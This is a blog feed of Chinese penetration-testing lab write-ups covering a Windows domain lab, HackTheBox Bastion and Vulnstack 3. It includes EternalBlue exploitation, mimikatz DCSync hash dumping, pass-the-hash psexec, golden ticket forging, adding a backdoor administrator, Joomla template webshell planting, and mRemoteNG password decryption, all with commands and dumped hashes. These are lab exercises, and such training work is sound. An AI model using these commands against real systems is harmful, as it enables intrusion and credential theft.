variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/812867c1e169a922cd715a7ebc5412ac_MD5.jpeg"></p><h1 id="172-22-1-21-XIAORANG-WIN7永恒之蓝"><a href="#172-22-1-21-XIAORANG-WIN7永恒之蓝" class="headerlink" title="172.22.1.21 XIAORANG-WIN7永恒之蓝"></a>172.22.1.21 XIAORANG-WIN7永恒之蓝</h1><p>先打下poc<br><img src="/Rxi134_FILE/f3ace0e2067cd9eef98aeac432605841_MD5.jpeg"></p><p>准备正连打永恒之蓝</p><p>但是利用session路由无法getshell，目前原因不明，感觉有可能是web机正连的原因🤔<br><img src="/Rxi134_FILE/d81a4b13f08ec3a482a79365d96c03de_MD5.jpeg"></p><p>proxychains就可以，这里因为ew老是断，代理换成了chisel<br><img src="/Rxi134_FILE/f95ab55548d00842facf4f4a8f80c32d_MD5.jpeg"><br><img src="/Rxi134_FILE/fd696530353cc7ce72132193d783c0b0_MD5.jpeg"></p><p>不过我没找到flag<br><img src="/Rxi134_FILE/6f49749112f09825c67fa48aa0b41488_MD5.jpeg"></p><p>而且无法弹出shell…<br><img src="/Rxi134_FILE/4f67bf4c0c360c1006d080e416d576e1_MD5.jpeg"></p><h2 id="域控同步滥用-mimikatz抓取"><a href="#域控同步滥用-mimikatz抓取" class="headerlink" title="域控同步滥用+mimikatz抓取"></a>域控同步滥用+mimikatz抓取</h2><p>msf自带kiwi模块，咱就不用手动上传了，很方便</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是只抓取到机器用户的NTLM哈希，没啥用<br><img src="/Rxi134_FILE/dc49e620262033bfc1e8c4b8d34e3bcb_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">XIAORANG-WIN7$NTLM：5dbcc8e0fa12e4aa99b7447bfa087add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过我们都是SYSTEM用户了，可以直接利用 DCSync，伪造我们是一个域控发出同步申请，从而获取域用户哈希</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[DC] 'xiaorang.lab' will be the domain[DC] 'DC01.xiaorang.lab' will be the DC server[DC] Exporting domain 'xiaorang.lab'[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        5141106    Marcus  e07510a4284b3c97c8e7dee970918c5c        5121107    Charles f6a9881cd5ae709abb4ac9ab87f24617        5121000    DC01$   94c59dda4a0ec229d4b4cf45dba98dbf        5324801104    XIAORANG-OA01$  dc5f050393a7cc83e0518b8015b8b65d        4096500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        5121108    XIAORANG-WIN7$  8b7dea43bed4b560504e925f0f1b5efd        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="172-22-1-2-DC01"><a href="#172-22-1-2-DC01" class="headerlink" title="172.22.1.2 DC01"></a>172.22.1.2 DC01</h1><h2 id="pth-psexec拿下域控"><a href="#pth-psexec拿下域控" class="headerlink" title="pth+psexec拿下域控"></a>pth+psexec拿下域控</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psexec.exe xiaorang.lab/administrator@172.22.1.2 <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:10cf89a850fb1cdbe6bb432b859164c8 -dc-ip <span class="token number">172.22</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee9dcfd5a0bc36581cf73b44edbc1ba5_MD5.jpeg"></p><h2 id="获取flag3"><a href="#获取flag3" class="headerlink" title="获取flag3"></a>获取flag3</h2><p><img src="/Rxi134_FILE/7981278fa41cc9988280d60ad8cd5c40_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="权限维持（黄金票据）"><a href="#权限维持（黄金票据）" class="headerlink" title="权限维持（黄金票据）"></a>权限维持（黄金票据）</h2><p>我们已经有krbtgt账户的NT hash，以此来制作黄金票据实现域权限维持</p><p>查看域SID</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\Windows\system32>powershell -c "(Get-ADDomain).DomainSID"BinaryLength AccountDomainSid                         Value------------ ----------------                         -----          24 S-1-5-21-314492864-3856862959-4045974917 S-1-5-21-314492864-385...C:\Windows\system32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>制作黄金票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ticketer.py -domain-sid S-1-5-21-314492864-3856862959-4045974917 <span class="token parameter variable">-nthash</span> fb812eea13a18b7fcdb8e6d67ddc205b <span class="token parameter variable">-domain</span> xiaorang.lab administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导入票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时绑定ip<br><img src="/Rxi134_FILE/38f28d489d1a44d14227971361df823a_MD5.jpeg"></p><p>但还是无法连接，原因不明<br><img src="/Rxi134_FILE/a4105ba270dc9575697f63bfb1275284_MD5.jpeg"></p><p>感觉有可能是域环境的问题<br><img src="/Rxi134_FILE/3dcb1bde5b35bbbfa5599aaf9842925a_MD5.jpeg"></p><h1 id="172-22-1-18-XIAORANG-OA01-信呼OA"><a href="#172-22-1-18-XIAORANG-OA01-信呼OA" class="headerlink" title="172.22.1.18 XIAORANG-OA01 信呼OA"></a>172.22.1.18 XIAORANG-OA01 信呼OA</h1><h2 id="获取flag2"><a href="#获取flag2" class="headerlink" title="获取flag2"></a>获取flag2</h2><p>其实有了域管就可以直接登录了<br><img src="/Rxi134_FILE/70fd03a3bec5e8486a1116547faaab91_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">2ce3-4813-87d4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>机器开了rdp，顺带添加个管理员用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user hacker 1qaz2wsx /addnet localgroup administrators hacker /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/ff8a5db87663fad5dbe1ec090188b2b0_MD5.jpeg"></p><p>看了wp，要是硬打其实也比较简单，就不做了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>msf是很方便的东西</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W Easy-Bastion</title>
      <link href="/2024/10/06/W%20Easy-Bastion/"/>
      <url>/2024/10/06/W%20Easy-Bastion/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE  SERVICE      VERSION22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)25/tcp    closed smtp110/tcp   closed pop3135/tcp   open   msrpc        Microsoft Windows RPC139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open   msrpc        Microsoft Windows RPC49665/tcp open   msrpc        Microsoft Windows RPC49666/tcp open   msrpc        Microsoft Windows RPC49667/tcp open   msrpc        Microsoft Windows RPC49668/tcp open   msrpc        Microsoft Windows RPC49669/tcp open   msrpc        Microsoft Windows RPC49670/tcp open   msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵-驻足"><a href="#入侵-驻足" class="headerlink" title="入侵 &amp; 驻足"></a>入侵 &amp; 驻足</h1><h2 id="smb-guest登录策略"><a href="#smb-guest登录策略" class="headerlink" title="smb guest登录策略"></a>smb guest登录策略</h2><p>对smb进行枚举<br><img src="/Rxi134_FILE/f6c2c7ba974326656f4877f7574b70c3_MD5.jpeg"><br>开启了guest登录策略，随机的用户名都会映射为guest用户</p><p><img src="/Rxi134_FILE/2c5baf067163bd972aa8780521eb8dad_MD5.jpeg"></p><h2 id="发现备份文件夹"><a href="#发现备份文件夹" class="headerlink" title="发现备份文件夹"></a>发现备份文件夹</h2><p>其中有个 note.txt 和 文件夹 WindowsImageBackup<br><img src="/Rxi134_FILE/41f43da27c87c35f9254b53c56ebc304_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.系统管理员：请不要将整个备份文件传输到本地，到子公司的 VPN 太慢了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><p>有两个vhd文件，分别进行挂载，只有一个盘里有东西<br><img src="/Rxi134_FILE/51cdaecb2c4cf1eead38021f71ae2d1c_MD5.jpeg"><br><img src="/Rxi134_FILE/f30f207fd53fb255d38e1a450334eb2d_MD5.jpeg"></p><h2 id="转储-SAM-SYSTEM"><a href="#转储-SAM-SYSTEM" class="headerlink" title="转储 SAM &amp; SYSTEM"></a>转储 SAM &amp; SYSTEM</h2><p>先看看能不能把默认账密搞到手<br><img src="/Rxi134_FILE/07dff079d282657e71ddd77fde55300e_MD5.jpeg"><br>利用mimikatz解密<br><img src="/Rxi134_FILE/3344986976eb459e67d751a265ab16f7_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RID  : 000001f4 (500)User : Administrator  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID  : 000001f5 (501)User : GuestRID  : 000003e8 (1000)User : L4mpje  Hash NTLM: 26112010952d963c8dc4217daec986d9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到彩虹表查下<br><img src="/Rxi134_FILE/aabcee57e6af159e13b02acbe1c9f2e8_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">L4mpje:bureaulampje<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="openssh连接"><a href="#openssh连接" class="headerlink" title="openssh连接"></a>openssh连接</h2><p>ssh直接上去了<br><img src="/Rxi134_FILE/c2241c837a4a93e6f105d90a9319ad4b_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="上传winpeas"><a href="#上传winpeas" class="headerlink" title="上传winpeas"></a>上传winpeas</h2><p>上传 winpeas 先进行一波收集，常见的攻击向量都没什么可用的</p><p>还有一个攻击向量是受攻击程序，但是用户权限太低了，连列出计算机安装的应用程序都做不到<br><img src="/Rxi134_FILE/11cb658d90ab733ab4215a72b3211f3a_MD5.jpeg"><br>我只能手动去翻翻Program Files了<br><img src="/Rxi134_FILE/2557f5b7e5b8155f61d1f8ff2bc58439_MD5.jpeg"></p><h2 id="利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码"><a href="#利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码" class="headerlink" title="利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码"></a>利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码</h2><blockquote><p><strong>mRemoteNG</strong> 是一个开源、多协议的远程连接管理器，支持多种远程连接协议，如 RDP（远程桌面）、VNC、SSH、Telnet 等。它通过集中化的管理界面，帮助用户快速组织和访问多台服务器或设备。</p></blockquote><p>下载下来看看版本，1.76.11<br><img src="/Rxi134_FILE/c5f4bbc6cfc831119faf18febec1633a_MD5.jpeg"></p><p><img src="/Rxi134_FILE/1bf55d33d97ed8c04969608258385bf8_MD5.jpeg"><br>请注意，配置密码加密和连接文件加密是不同的设置。配置密码加密仅用于加密配置文件中的密码，而连接文件加密用于加密整个配置文件本身。</p><p>此漏洞通过从内存中转储已解密的配置来绕过连接文件加密。但是不包含配置文件加密的密码（默认密钥 <code>mR3m</code> ），如果已设置自定义配置密码加密密钥&#x2F;密码，攻击者仍必须猜测自定义密钥。（参见 <a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file#mremoteng_decryptpy">mremoteng-decrypt.py 部分</a>）</p><p>确定加密的配置文件位置</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">l4mpje@BASTION C:\Users\L4mpje>dir c:\ /s /b | find "confCons.xml"                  c:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xmlc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402277353.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402339071.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402379227.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403070644.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403100488.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403220026.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403261268.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403272831.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403433299.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403486580.backup   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/192185e805cf2007aa0070c4db5760ec_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用脚本：<a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file">S1lkys&#x2F;CVE-2023-30367-mRemoteNG-password-dumper: Original PoC for CVE-2023-30367 (github.com)</a></p><p>解密如下<br><img src="/Rxi134_FILE/3dbfa1187e51d551f8073a269d52f1b0_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:thXLHM96BeKL0ER2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/62e546d0998c7bbe4efeed3aff61a5b5_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-3</title>
      <link href="/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/"/>
      <url>/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>VMnet2和VMnet3配置如图所示<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p><p>然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>黑盒模式，没有账密</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先扫端口</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: |   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)80/tcp   open  http    nginx 1.9.4|_http-title: Home|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-generator: Joomla! - Open Source Content Management| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.9.4| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1| mysql-info: |   Protocol: 10|   Version: 5.7.27-0ubuntu0.16.04.1|   Thread ID: 13|   Capabilities flags: 63487|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults|   Status: Autocommit|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>22端口：ssh<br>80端口：这里扫出来一个 robots.txt，里面是joomla cms的目录<br>3306端口：mysql 5.7.27</p><p>goby上去打些常用poc，直接给我扫出个弱口令，<code>root:123</code><br><img src="/Rxi134_FILE/78677d2143ef5d9c9634c796800f071e_MD5.jpeg"><br>先不急着利用，再搜集些信息</p><p>Joomla CMS<br><img src="/Rxi134_FILE/8f51a446c2a6450bf98a94f5984556d0_MD5.jpeg"></p><p>Joomlascan扫出来一些目录信息，Joomla 3.9.12<br><img src="/Rxi134_FILE/2008ef20127c13f867bb5f0c6854e5d0_MD5.jpeg"></p><p>这里泄露了joomla的配置文件，其中包含了数据库密码和网站绝对路径<br><img src="/Rxi134_FILE/9511a58529b2dc8583373356f598d030_MD5.jpeg"><br><img src="/Rxi134_FILE/7d49600c2c611bd434de1e727f152f2d_MD5.jpeg"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'testuser'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cvcvgjASD!@'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'joomla'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'am2zu_'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gXN9Wbpk7ef3A4Ys'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远程连接数据库，先找找有没有可用的信息，在两个表里存放了账密信息<br><img src="/Rxi134_FILE/b374998d36dab3a65144481d70d63367_MD5.jpeg"></p><p>我们这个用户权限很低，几乎无权进行任何写操作<br><img src="/Rxi134_FILE/6059b9fba6afe41ea3719b42fb46155c_MD5.jpeg"></p><h1 id="尝试数据库写马"><a href="#尝试数据库写马" class="headerlink" title="尝试数据库写马"></a>尝试数据库写马</h1><p>回到root用户，现在有网站的绝对路径，into oufile是没有限制，但是网站目录无权写入<br><img src="/Rxi134_FILE/92032314d1c8e5806e2c200151dd34f5_MD5.jpeg"></p><h1 id="尝试破解哈希"><a href="#尝试破解哈希" class="headerlink" title="尝试破解哈希"></a>尝试破解哈希</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">891Super Useradministratortest@test.com$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2184Super Useradmintest@test.com$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>becrypt，hashcat没爆出来</p><h1 id="尝试添加新用户"><a href="#尝试添加新用户" class="headerlink" title="尝试添加新用户"></a>尝试添加新用户</h1><p><img src="/Rxi134_FILE/ae2610f8d43a4f32cafab473d5459e67_MD5.jpeg"><br>添加了一个用户，但还是登陆失败</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_users<span class="token variable">`</span></span>   <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>name<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>password<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>params<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>registerDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastvisitDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastResetTime<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span><span class="token string">'Administrator2'</span>, <span class="token string">'admin2'</span>,    <span class="token string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="token string">''</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_user_usergroup_map<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>user_id<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>group_id<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span>LAST_INSERT_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把管理员密码改掉就能登上了<br><img src="/Rxi134_FILE/146fb934f6679b623540b3006b2732fe_MD5.jpeg"><br><img src="/Rxi134_FILE/d4a5ab449597882bd67504629888279e_MD5.jpeg"></p><h1 id="Joomla-后台主题写马"><a href="#Joomla-后台主题写马" class="headerlink" title="Joomla!后台主题写马"></a>Joomla!后台主题写马</h1><p><img src="/Rxi134_FILE/6740098f1b6cc83b4bdd8c52d1b89792_MD5.jpeg"></p><p>任意点击一个主题，修改模板，访问&#x2F;templates&#x2F;beez3&#x2F;error.php即可，上的蚁剑</p><h2 id="disabled-function绕过"><a href="#disabled-function绕过" class="headerlink" title="disabled_function绕过"></a>disabled_function绕过</h2><p>收到 disabled_function 的限制<br><img src="/Rxi134_FILE/9c6a0ef4e19e9a0e0d430910129ee794_MD5.jpeg"></p><p>蚁剑有专门的插件，PHP7_GC_UAF可以成功绕过<br><img src="/Rxi134_FILE/3fc2dc2771fd7290096d71b82198b1ea_MD5.jpeg"></p><h1 id="权限提升到用户"><a href="#权限提升到用户" class="headerlink" title="权限提升到用户"></a>权限提升到用户</h1><p>开了22端口，看看有没有id_rsa<br><img src="/Rxi134_FILE/92f8b5eead72a9227bdd38034f59d422_MD5.jpeg"><br>没有.ssh文件夹，看来不行</p><p>上传linpeas进行一波收集，也没有什么可用的攻击面，倒是内核版本很低，可以提权<br><img src="/Rxi134_FILE/adbec4c2b344b7caa56b72867a62b2b0_MD5.jpeg"></p><p>模糊匹配一些敏感词，比如password、passwd、pass、username</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-E</span> <span class="token string">'passwd*|password*'</span> /var/www/html /home/yy /tmp  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/cd51a330c12b4b26c72a9d13cff7ffe2_MD5.jpeg"></p><p>在&#x2F;tmp下找到可疑账密<br><img src="/Rxi134_FILE/8f2484e2010dab9fb80f512537793802_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adduser wwwuserpasswd wwwuser_123Aqx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh<br><img src="/Rxi134_FILE/734b925dfa65474c2bafd496dd89bc56_MD5.jpeg"></p><p>再上linpeas进行一波收集，还是没什么可用的</p><h1 id="93网段探测"><a href="#93网段探测" class="headerlink" title="93网段探测"></a>93网段探测</h1><p>存在一个 93 网段<br><img src="/Rxi134_FILE/40dfbfc534c50942d6723dda6a74e4ce_MD5.jpeg"></p><p>不好上线CS，这里选择上线msf<br><img src="/Rxi134_FILE/eab5ad07341f9718763f4f9d39ed346d_MD5.jpeg"></p><h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><p>上传fscan</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start ping(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.20   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.100  is alive(icmp) Target 192.168.93.120  is alive[*] Icmp alive hosts len is: 5192.168.93.20:80 open192.168.93.30:135 open192.168.93.10:135 open192.168.93.20:135 open192.168.93.120:22 open192.168.93.100:80 open192.168.93.100:22 open192.168.93.30:445 open192.168.93.30:139 open192.168.93.100:3306 open192.168.93.20:1433 open192.168.93.120:3306 open192.168.93.10:139 open192.168.93.20:445 open192.168.93.20:139 open192.168.93.10:445 open192.168.93.120:80 open192.168.93.10:88 open[*] alive ports len is: 18start vulscan[*] NetInfo [*]192.168.93.30   [->]win7   [->]192.168.93.30[*] NetInfo [*]192.168.93.10   [->]WIN-8GA56TNV3MV   [->]192.168.93.10[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600[*] OsInfo 192.168.93.10(Windows Server 2012 R2 Datacenter 9600)[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2[*] NetInfo [*]192.168.93.20   [->]win2008   [->]192.168.93.20[*] OsInfo 192.168.93.30(Windows 7 Professional 7601 Service Pack 1)[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found[*] OsInfo 192.168.93.20(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)[+] mysql 192.168.93.100:3306:root 123[+] mysql 192.168.93.120:3306:root 123[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home[*] WebTitle 